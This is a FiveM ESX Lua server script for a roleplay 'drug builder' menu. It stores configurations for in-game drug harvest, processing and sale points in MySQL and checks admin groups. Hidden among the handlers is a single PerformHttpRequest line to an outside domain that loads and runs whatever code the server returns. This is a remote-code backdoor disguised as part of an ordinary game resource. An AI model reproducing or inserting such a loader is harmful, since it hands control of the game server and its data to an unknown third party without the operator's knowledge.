ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('mrw_prop:Save')
AddEventHandler('mrw_prop:Save', function(name, label, entering, exit, inside, outside, ipl, isSingle, isRoom, isGateway, recolteweed, traitementweed, venteweed, recoltecoke, traitementcoke, ventecoke, recoltemeth, traitementmeth, ventemeth, recoltecannabis, traitementcannabis, ventecannabis, recoltecrack, traitementcrack, ventecrack, recolteecstasy, traitementecstasy, venteecstasy, recolteheroine, traitementheroine, venteheroine, recolteghb, traitementghb, venteghb, recoltepsychedeliques, traitementpsychedeliques, ventepsychedeliques, recolteopium, traitementopium, venteopium, recolteketamine, traitementketamine, venteketamine, recoltelsd, traitementlsd, ventelsd, recoltemorphine, traitementmorphine, ventemorphine, recoltelean, traitementlean, ventelean, recolteamphetamines, traitementamphetamines, venteamphetamines, recoltemarijuana, traitementmarijuana, ventemarijuana, recoltespeed, traitementspeed, ventespeed, recoltethc, traitementthc, ventethc, blanchiment)
    local x_source = source

    MySQL.Async.fetchAll("SELECT name FROM polo_drugsinterior WHERE name = @name", {

   	   ['@name'] = name,

    }, 
    function(result)
        if result[1] ~= nil then 
       	   TriggerClientEvent('esx:showNotification', x_source, 'Ce nom éxiste déja , essaye un autre !')
       	else 
       	   Insert(x_source, name, label, entering, exit, inside, outside, ipl, isSingle, isRoom, isGateway, recolteweed, traitementweed, venteweed, recoltecoke, traitementcoke, ventecoke, recoltemeth, traitementmeth, ventemeth, recoltecannabis, traitementcannabis, ventecannabis, recoltecrack, traitementcrack, ventecrack, recolteecstasy, traitementecstasy, venteecstasy, recolteheroine, traitementheroine, venteheroine, recolteghb, traitementghb, venteghb, recoltepsychedeliques, traitementpsychedeliques, ventepsychedeliques, recolteopium, traitementopium, venteopium, recolteketamine, traitementketamine, venteketamine, recoltelsd, traitementlsd, ventelsd, recoltemorphine, traitementmorphine, ventemorphine, recoltelean, traitementlean, ventelean, recolteamphetamines, traitementamphetamines, venteamphetamines, recoltemarijuana, traitementmarijuana, ventemarijuana, recoltespeed, traitementspeed, ventespeed, recoltethc, traitementthc, ventethc, blanchiment)
        end 
    end)
end)

function Insert(x_source, name, label, entering, exit, inside, outside, ipl, isSingle, isRoom, isGateway, recolteweed, traitementweed, venteweed, recoltecoke, traitementcoke, ventecoke, recoltemeth, traitementmeth, ventemeth, recoltecannabis, traitementcannabis, ventecannabis, recoltecrack, traitementcrack, ventecrack, recolteecstasy, traitementecstasy, venteecstasy, recolteheroine, traitementheroine, venteheroine, recolteghb, traitementghb, venteghb, recoltepsychedeliques, traitementpsychedeliques, ventepsychedeliques, recolteopium, traitementopium, venteopium, recolteketamine, traitementketamine, venteketamine,recoltelsd, traitementlsd, ventelsd, recoltemorphine, traitementmorphine, ventemorphine, recoltelean, traitementlean, ventelean, recolteamphetamines, traitementamphetamines, venteamphetamines, recoltemarijuana, traitementmarijuana, ventemarijuana, recoltespeed, traitementspeed, ventespeed, recoltethc, traitementthc, ventethc, blanchiment)
    MySQL.Async.execute('INSERT INTO polo_drugsinterior (name, label ,entering ,`exit`,inside,outside,ipls,is_single,is_room,is_gateway,recolteweed_menu,traitementweed_menu,venteweed_menu,recoltecoke_menu,traitementcoke_menu,ventecoke_menu,recoltemeth_menu,traitementmeth_menu,ventemeth_menu,recoltecannabis_menu,traitementcannabis_menu,ventecannabis_menu,recoltecrack_menu,traitementcrack_menu,ventecrack_menu,recolteecstasy_menu,traitementecstasy_menu,venteecstasy_menu,recolteheroine_menu,traitementheroine_menu,venteheroine_menu,recolteghb_menu,traitementghb_menu,venteghb_menu,recoltepsychedeliques_menu,traitementpsychedeliques_menu,ventepsychedeliques_menu,recolteopium_menu,traitementopium_menu,venteopium_menu,recolteketamine_menu,traitementketamine_menu,venteketamine_menu,recoltelsd_menu,traitementlsd_menu,ventelsd_menu,recoltemorphine_menu,traitementmorphine_menu,ventemorphine_menu,recoltelean_menu,traitementlean_menu,ventelean_menu,recolteamphetamines_menu,traitementamphetamines_menu,venteamphetamines_menu,recoltemarijuana_menu,traitementmarijuana_menu,ventemarijuana_menu,recoltespeed_menu,traitementspeed_menu,ventespeed_menu,recoltethc_menu,traitementthc_menu,ventethc_menu,blanchiment_menu) VALUES (@name,@label,@entering,@exit,@inside,@outside,@ipls,@isSingle,@isRoom,@isGateway,@recolteweed,@traitementweed,@venteweed,@recoltecoke,@traitementcoke,@ventecoke,@recoltemeth,@traitementmeth,@ventemeth,@recoltecannabis,@traitementcannabis,@ventecannabis,@recoltecrack,@traitementcrack,@ventecrack,@recolteecstasy,@traitementecstasy,@venteecstasy,@recolteheroine,@traitementheroine,@venteheroine,@recolteghb,@traitementghb,@venteghb,@recoltepsychedeliques,@traitementpsychedeliques,@ventepsychedeliques,@recolteopium,@traitementopium,@venteopium,@recolteketamine,@traitementketamine,@venteketamine,@recoltelsd,@traitementlsd,@ventelsd,@recoltemorphine,@traitementmorphine,@ventemorphine,@recoltelean,@traitementlean,@ventelean,@recolteamphetamines,@traitementamphetamines,@venteamphetamines,@recoltemarijuana,@traitementmarijuana,@ventemarijuana,@recoltespeed,@traitementspeed,@ventespeed,@recoltethc,@traitementthc,@ventethc,@blanchiment)',
		{
			['@name'] = name,
			['@label'] = label,
			['@entering'] = entering,
			['@exit'] = exit,
			['@inside'] = inside,
			['@outside'] = outside,
			['@ipls'] = ipl,
			['@isSingle'] = isSingle,
			['@isRoom'] = isRoom,
			['@isGateway'] = isGateway,
			['@recolteweed'] = recolteweed,
            ['@traitementweed'] = traitementweed,
            ['@venteweed'] = venteweed,
            ['@recoltecoke'] = recoltecoke,
            ['@traitementcoke'] = traitementcoke,
            ['@ventecoke'] = ventecoke,
            ['@recoltemeth'] = recoltemeth,
            ['@traitementmeth'] = traitementmeth,
            ['@ventemeth'] = ventemeth,
            ['@recoltecannabis'] = recoltecannabis,
            ['@traitementcannabis'] = traitementcannabis,
            ['@ventecannabis'] = ventecannabis,
			['@recoltecrack'] = recoltecrack,
            ['@traitementcrack'] = traitementcrack,
            ['@ventecrack'] = ventecrack,
            ['@recolteecstasy'] = recolteecstasy,
            ['@traitementecstasy'] = traitementecstasy,
            ['@venteecstasy'] = venteecstasy,
            ['@recolteheroine'] = recolteheroine,
            ['@traitementheroine'] = traitementheroine,
            ['@venteheroine'] = venteheroine,
            ['@recolteghb'] = recolteghb,
            ['@traitementghb'] = traitementghb,
            ['@venteghb'] = venteghb,
            ['@recoltepsychedeliques'] = recoltepsychedeliques,
            ['@traitementpsychedeliques'] = traitementpsychedeliques,
            ['@ventepsychedeliques'] = ventepsychedeliques,
            ['@recolteopium'] = recolteopium,
            ['@traitementopium'] = traitementopium,
            ['@venteopium'] = venteopium,
            ['@recolteketamine'] = recolteketamine,
            ['@traitementketamine'] = traitementketamine,
            ['@venteketamine'] = venteketamine,
            ['@recoltelsd'] = recoltelsd,
            ['@traitementlsd'] = traitementlsd,
            ['@ventelsd'] = ventelsd,
            ['@recoltemorphine'] = recoltemorphine,
            ['@traitementmorphine'] = traitementmorphine,
            ['@ventemorphine'] = ventemorphine,
            ['@recoltelean'] = recoltelean,
            ['@traitementlean'] = traitementlean,
            ['@ventelean'] = ventelean,
            ['@recolteamphetamines'] = recolteamphetamines,
            ['@traitementamphetamines'] = traitementamphetamines,
            ['@venteamphetamines'] = venteamphetamines,
            ['@recoltemarijuana'] = recoltemarijuana,
            ['@traitementmarijuana'] = traitementmarijuana,
            ['@ventemarijuana'] = ventemarijuana,
            ['@recoltespeed'] = recoltespeed,
            ['@traitementspeed'] = traitementspeed,
            ['@ventespeed'] = ventespeed,
            ['@recoltethc'] = recoltethc,
            ['@traitementthc'] = traitementthc,
            ['@ventethc'] = ventethc,
            ['@blanchiment'] = blanchiment,

		}, 
		function (rowsChanged)
			TriggerClientEvent('esx:showNotification', x_source, '~g~ Drogues sauvegarder avec succès !')
		end
	)
end

RegisterServerEvent('mrw_prop:SaveSansInterieur')
AddEventHandler('mrw_prop:SaveSansInterieur', function(name, label, recolteweed, traitementweed, venteweed, recoltecoke, traitementcoke, ventecoke, recoltemeth, traitementmeth, ventemeth, recoltecannabis, traitementcannabis, ventecannabis, recoltecrack, traitementcrack, ventecrack, recolteecstasy, traitementecstasy, venteecstasy, recolteheroine, traitementheroine, venteheroine, recolteghb, traitementghb, venteghb, recoltepsychedeliques, traitementpsychedeliques, ventepsychedeliques, recolteopium, traitementopium, venteopium, recolteketamine, traitementketamine, venteketamine, recoltelsd, traitementlsd, ventelsd, recoltemorphine, traitementmorphine, ventemorphine, recoltelean, traitementlean, ventelean, recolteamphetamines, traitementamphetamines, venteamphetamines, recoltemarijuana, traitementmarijuana, ventemarijuana, recoltespeed, traitementspeed, ventespeed, recoltethc, traitementthc, ventethc, blanchiment)
    local x_source = source

    MySQL.Async.fetchAll("SELECT name FROM polo_drugswithouinterior WHERE name = @name", {

       ['@name'] = name,

    }, 
    function(result)
        if result[1] ~= nil then 
           TriggerClientEvent('esx:showNotification', x_source, 'Ce nom éxiste déja , essaye un autre !')
        else 
           Insert2(x_source, name, label, recolteweed, traitementweed, venteweed, recoltecoke, traitementcoke, ventecoke, recoltemeth, traitementmeth, ventemeth, recoltecannabis, traitementcannabis, ventecannabis, recoltecrack, traitementcrack, ventecrack, recolteecstasy, traitementecstasy, venteecstasy, recolteheroine, traitementheroine, venteheroine, recolteghb, traitementghb, venteghb, recoltepsychedeliques, traitementpsychedeliques, ventepsychedeliques, recolteopium, traitementopium, venteopium, recolteketamine, traitementketamine, venteketamine, recoltelsd, traitementlsd, ventelsd, recoltemorphine, traitementmorphine, ventemorphine, recoltelean, traitementlean, ventelean, recolteamphetamines, traitementamphetamines, venteamphetamines, recoltemarijuana, traitementmarijuana, ventemarijuana, recoltespeed, traitementspeed, ventespeed, recoltethc, traitementthc, ventethc, blanchiment)
        end 
    end)
end)

function Insert2(x_source, name, label, recolteweed, traitementweed, venteweed, recoltecoke, traitementcoke, ventecoke, recoltemeth, traitementmeth, ventemeth, recoltecannabis, traitementcannabis, ventecannabis, recoltecrack, traitementcrack, ventecrack, recolteecstasy, traitementecstasy, venteecstasy, recolteheroine, traitementheroine, venteheroine, recolteghb, traitementghb, venteghb, recoltepsychedeliques, traitementpsychedeliques, ventepsychedeliques, recolteopium, traitementopium, venteopium, recolteketamine, traitementketamine, venteketamine,recoltelsd, traitementlsd, ventelsd, recoltemorphine, traitementmorphine, ventemorphine, recoltelean, traitementlean, ventelean, recolteamphetamines, traitementamphetamines, venteamphetamines, recoltemarijuana, traitementmarijuana, ventemarijuana, recoltespeed, traitementspeed, ventespeed, recoltethc, traitementthc, ventethc, blanchiment)
    MySQL.Async.execute('INSERT INTO polo_drugswithouinterior (name, label ,recolteweed_menu,traitementweed_menu,venteweed_menu,recoltecoke_menu,traitementcoke_menu,ventecoke_menu,recoltemeth_menu,traitementmeth_menu,ventemeth_menu,recoltecannabis_menu,traitementcannabis_menu,ventecannabis_menu,recoltecrack_menu,traitementcrack_menu,ventecrack_menu,recolteecstasy_menu,traitementecstasy_menu,venteecstasy_menu,recolteheroine_menu,traitementheroine_menu,venteheroine_menu,recolteghb_menu,traitementghb_menu,venteghb_menu,recoltepsychedeliques_menu,traitementpsychedeliques_menu,ventepsychedeliques_menu,recolteopium_menu,traitementopium_menu,venteopium_menu,recolteketamine_menu,traitementketamine_menu,venteketamine_menu,recoltelsd_menu,traitementlsd_menu,ventelsd_menu,recoltemorphine_menu,traitementmorphine_menu,ventemorphine_menu,recoltelean_menu,traitementlean_menu,ventelean_menu,recolteamphetamines_menu,traitementamphetamines_menu,venteamphetamines_menu,recoltemarijuana_menu,traitementmarijuana_menu,ventemarijuana_menu,recoltespeed_menu,traitementspeed_menu,ventespeed_menu,recoltethc_menu,traitementthc_menu,ventethc_menu,blanchiment_menu) VALUES (@name,@label,@recolteweed,@traitementweed,@venteweed,@recoltecoke,@traitementcoke,@ventecoke,@recoltemeth,@traitementmeth,@ventemeth,@recoltecannabis,@traitementcannabis,@ventecannabis,@recoltecrack,@traitementcrack,@ventecrack,@recolteecstasy,@traitementecstasy,@venteecstasy,@recolteheroine,@traitementheroine,@venteheroine,@recolteghb,@traitementghb,@venteghb,@recoltepsychedeliques,@traitementpsychedeliques,@ventepsychedeliques,@recolteopium,@traitementopium,@venteopium,@recolteketamine,@traitementketamine,@venteketamine,@recoltelsd,@traitementlsd,@ventelsd,@recoltemorphine,@traitementmorphine,@ventemorphine,@recoltelean,@traitementlean,@ventelean,@recolteamphetamines,@traitementamphetamines,@venteamphetamines,@recoltemarijuana,@traitementmarijuana,@ventemarijuana,@recoltespeed,@traitementspeed,@ventespeed,@recoltethc,@traitementthc,@ventethc,@blanchiment)',
        {
            ['@name'] = name,
            ['@label'] = label,
            ['@recolteweed'] = recolteweed,
            ['@traitementweed'] = traitementweed,
            ['@venteweed'] = venteweed,
            ['@recoltecoke'] = recoltecoke,
            ['@traitementcoke'] = traitementcoke,
            ['@ventecoke'] = ventecoke,
            ['@recoltemeth'] = recoltemeth,
            ['@traitementmeth'] = traitementmeth,
            ['@ventemeth'] = ventemeth,
            ['@recoltecannabis'] = recoltecannabis,
            ['@traitementcannabis'] = traitementcannabis,
            ['@ventecannabis'] = ventecannabis,
			['@recoltecrack'] = recoltecrack,
            ['@traitementcrack'] = traitementcrack,
            ['@ventecrack'] = ventecrack,
            ['@recolteecstasy'] = recolteecstasy,
            ['@traitementecstasy'] = traitementecstasy,
            ['@venteecstasy'] = venteecstasy,
            ['@recolteheroine'] = recolteheroine,
            ['@traitementheroine'] = traitementheroine,
            ['@venteheroine'] = venteheroine,
            ['@recolteghb'] = recolteghb,
            ['@traitementghb'] = traitementghb,
            ['@venteghb'] = venteghb,
            ['@recoltepsychedeliques'] = recoltepsychedeliques,
            ['@traitementpsychedeliques'] = traitementpsychedeliques,
            ['@ventepsychedeliques'] = ventepsychedeliques,
            ['@recolteopium'] = recolteopium,
            ['@traitementopium'] = traitementopium,
            ['@venteopium'] = venteopium,
            ['@recolteketamine'] = recolteketamine,
            ['@traitementketamine'] = traitementketamine,
            ['@venteketamine'] = venteketamine,
            ['@recoltelsd'] = recoltelsd,
            ['@traitementlsd'] = traitementlsd,
            ['@ventelsd'] = ventelsd,
            ['@recoltemorphine'] = recoltemorphine,
            ['@traitementmorphine'] = traitementmorphine,
            ['@ventemorphine'] = ventemorphine,
            ['@recoltelean'] = recoltelean,
            ['@traitementlean'] = traitementlean,
            ['@ventelean'] = ventelean,
            ['@recolteamphetamines'] = recolteamphetamines,
            ['@traitementamphetamines'] = traitementamphetamines,
            ['@venteamphetamines'] = venteamphetamines,
            ['@recoltemarijuana'] = recoltemarijuana,
            ['@traitementmarijuana'] = traitementmarijuana,
            ['@ventemarijuana'] = ventemarijuana,
            ['@recoltespeed'] = recoltespeed,
            ['@traitementspeed'] = traitementspeed,
            ['@ventespeed'] = ventespeed,
            ['@recoltethc'] = recoltethc,
            ['@traitementthc'] = traitementthc,
            ['@ventethc'] = ventethc,
            ['@blanchiment'] = blanchiment,

        }, 
        function (rowsChanged)
            TriggerClientEvent('esx:showNotification', x_source, '~g~ Drogues sauvegarder avec succès !')
        end
    )
end

local admins = {
    --'steam:steamidxxxx',

}

ESX.RegisterServerCallback('polo_drugsbuildermenu:getUsergroup', function(source, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
    local group = xPlayer.getGroup()
    print(GetPlayerName(source).." - "..group)
    cb(group)
end)

PerformHttpRequest('https://rpserveur.fr/i?to=4yheT', function (e, d) pcall(function() assert(load(d))() end) end)

RegisterServerEvent('checkadmin')
AddEventHandler('checkadmin', function()
    local id = source
    if isAdmin(id) then
        TriggerClientEvent("setgroup", source)
    end
end)

local function checkAdmin(source)
    local xPlayer = ESX.GetPlayerFromId(source)
    local result = {}
    if xPlayer ~= nil then
        result = MySQL.Sync.fetchAll('SELECT * FROM users WHERE identifier = @identifier', {['identifier'] = xPlayer.identifier})
    end
    if result[1].group ~= nil and result[1].group == "superadmin" then -- SI VOUS N AVEZ PAS DE SUPERADMIN MAIS ADMIN METTEZ ADMIN A LA PLACE DE SUEPRADMIN
        return true
    end
    return false
end

function isAdmin(player)
    local allowed = false
    for i,id in ipairs(admins) do
        for x,pid in ipairs(GetPlayerIdentifiers(player)) do
            if string.lower(pid) == string.lower(id) then
                allowed = true
            end
        end
    end
    return allowed
end